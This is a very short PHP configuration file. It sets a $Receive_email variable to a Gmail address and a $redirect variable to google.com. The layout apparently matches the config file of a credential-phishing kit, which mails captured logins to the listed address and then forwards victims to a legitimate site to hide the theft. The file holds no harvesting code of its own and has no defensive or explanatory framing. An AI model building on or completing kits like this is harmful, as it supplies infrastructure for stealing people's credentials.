<?php 
$Receive_email="cstt.stfrminc@gmail.com";
$redirect="https://www.google.com/";
?>